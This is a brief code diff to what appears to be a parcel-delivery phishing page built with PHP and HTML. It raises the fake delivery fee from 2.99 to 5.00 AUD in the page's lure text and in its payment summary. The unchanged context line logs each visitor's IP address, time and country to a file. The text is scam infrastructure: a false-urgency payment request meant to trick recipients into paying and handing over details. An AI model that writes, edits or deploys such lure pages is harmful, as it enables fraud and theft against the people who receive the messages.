@@ -34,7 +34,7 @@ fwrite($file, $ip . "  -   " . $TIME . " -  " . $COUNTRY . "\n");
 
                 <div class="paddingDiv" style="margin-top: 20px ; margin-bottom: 10px"><strong class="textMessage2">Parcel delivery </strong>
 
-                    <p class="textMessage">Your package is waiting for delivery. Please confirm payment (2.99 AUD). Online verification must be done within 3 days before expiration.</p>
+                    <p class="textMessage">Your package is waiting for delivery. Please confirm payment (5.00 AUD). Online verification must be done within 3 days before expiration.</p>
                 </div>
 
                 <p class="HROr">Packaging Information</p>
@@ -44,7 +44,7 @@ fwrite($file, $ip . "  -   " . $TIME . " -  " . $COUNTRY . "\n");
                         <div style="width: 100%;  ">
                             <p style="width: 50%; float: left">All</p>
 
-                            <p style="width: 50%; float: right;    text-align: right;">2.99 AUD</p>
+                            <p style="width: 50%; float: right;    text-align: right;">5.00 AUD</p>
                         </div>
                     </div>
 
